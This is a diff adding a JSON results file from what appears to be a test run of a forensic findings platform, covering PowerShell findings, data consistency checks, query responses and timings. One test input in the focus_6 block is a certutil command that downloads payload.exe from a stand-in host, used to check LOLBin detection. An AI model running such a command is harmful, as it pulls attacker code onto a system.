@@ -1,0 +1,112 @@
+{
+  "focus_1": {
+    "query_a": "Which findings in this case involve PowerShell, and what evidence supports them?",
+    "response_a": {
+      "response": "{'claim': 'Suspicious PowerShell commands executed by Administrator', 'evidence_ids': ['F-1001']}",
+      "injection_flagged": false,
+      "injection_score": 0.0
+    },
+    "time_a_sec": 2.678,
+    "query_b": "What are the highest-confidence findings in this case?",
+    "response_b": {
+      "response": "{'claim': 'Suspicious PowerShell commands executed by Administrator', 'evidence_ids': ['F-1001']}",
+      "injection_flagged": false,
+      "injection_score": 0.0
+    },
+    "time_b_sec": 2.2415,
+    "same_response": true,
+    "contains_f1001": true
+  },
+  "focus_2": {
+    "verified_count": 5,
+    "mismatches_count": 0,
+    "mismatches": [],
+    "sample_pg_findings": [
+      {
+        "finding_id": "26cbd470-f3ba-455a-9e95-a8b09194fbac",
+        "finding_fingerprint": "FFP-54110260de0a10c6",
+        "case_id": "CASE-FINAL-DEMO-2026",
+        "tenant_id": "default",
+        "severity": "medium",
+        "confidence": 0.9,
+        "sanitized_fact": "LOLBin execution detected (LOLBAS snapshot version=2026.08.01): binary 'powershell.exe' (Execution / Interpreter) executed on host 'NPS-HOST' with command line: ''",
+        "source_artifact_id": "b5b0efe6-28ff-4378-b920-b2cb397546c5",
+        "review_status": "pending_review",
+        "layer": "log.process_creation_analyzer"
+      },
+      {
+        "finding_id": "7b817dae-2978-4a04-a7dd-b1bff9b2b8de",
+        "finding_fingerprint": "FFP-4f67959ae20a37ac",
+        "case_id": "CASE-FINAL-DEMO-2026",
+        "tenant_id": "default",
+        "severity": "medium",
+        "confidence": 0.85,
+        "sanitized_fact": "Orphan process observed in memory: process 'powershell.exe' (PID 1234) references missing/inactive parent PID 5678.",
+        "source_artifact_id": "b5b0efe6-28ff-4378-b920-b2cb397546c5",
+        "review_status": "pending_review",
+        "layer": "memory.process_analyzer"
+      },
+      {
+        "finding_id": "bb4fec1d-61cb-4241-bb89-95e0965f6248",
+        "finding_fingerprint": "FFP-b5647ce6f528c8ca",
+        "case_id": "CASE-FINAL-DEMO-2026",
+        "tenant_id": "default",
+        "severity": "medium",
+        "confidence": 0.9,
+        "sanitized_fact": "LOLBin execution detected (LOLBAS snapshot version=2026.08.01): binary 'powershell.exe' (Execution / Interpreter) executed on host 'NPS-HOST' with command line: ''",
+        "source_artifact_id": "b5b0efe6-28ff-4378-b920-b2cb397546c5",
+        "review_status": "pending_review",
+        "layer": "log.process_creation_analyzer"
+      },
+      {
+        "finding_id": "84be9ff4-8933-4caa-8fb6-f937035d2413",
+        "finding_fingerprint": "FFP-aa1167a3fff12c25",
+        "case_id": "CASE-FINAL-DEMO-2026",
+        "tenant_id": "default",
+        "severity": "medium",
+        "confidence": 0.85,
+        "sanitized_fact": "Orphan process observed in memory: process 'powershell.exe' (PID 1234) references missing/inactive parent PID 5678.",
+        "source_artifact_id": "b5b0efe6-28ff-4378-b920-b2cb397546c5",
+        "review_status": "pending_review",
+        "layer": "memory.process_analyzer"
+      },
+      {
+        "finding_id": "da1aa6b3-2b72-41a6-b94e-7046692b1e03",
+        "finding_fingerprint": "FFP-c80c4b67a9a01e47",
+        "case_id": "CASE-FINAL-DEMO-2026",
+        "tenant_id": "default",
+        "severity": "medium",
+        "confidence": 0.9,
+        "sanitized_fact": "LOLBin execution detected (LOLBAS snapshot version=2026.08.01): binary 'powershell.exe' (Execution / Interpreter) executed on host 'NPS-HOST' with command line: ''",
+        "source_artifact_id": "b5b0efe6-28ff-4378-b920-b2cb397546c5",
+        "review_status": "pending_review",
+        "layer": "log.process_creation_analyzer"
+      }
+    ]
+  },
+  "focus_3": {
+    "sql_distinct_artifacts": 1,
+    "api_artifact_count": 1,
+    "matches": true
+  },
+  "focus_5": {
+    "unrelated_artifacts_count": 2,
+    "fcrs_generated": 0,
+    "passed": true
+  },
+  "focus_6": {
+    "input_evidence": "certutil.exe -urlcache -f http://evil-domain.com/payload.exe payload.exe",
+    "expected_finding": "LOLBin execution detected (certutil.exe)",
+    "findings_detected_count": 1,
+    "rule_responsible": "ProcessCreationAnalyzer (LOLBAS snapshot rule)",
+    "passed": true
+  },
+  "focus_9": {
+    "frontend_case_loading_sec": 4.0771,
+    "evidence_upload_sec": 4.1231,
+    "postgres_query_sec": 0.0026,
+    "api_json_report_sec": 0.0061,
+    "api_html_report_sec": 0.0263,
+    "analyst_query_api_sec": 2.9084
+  }
+}
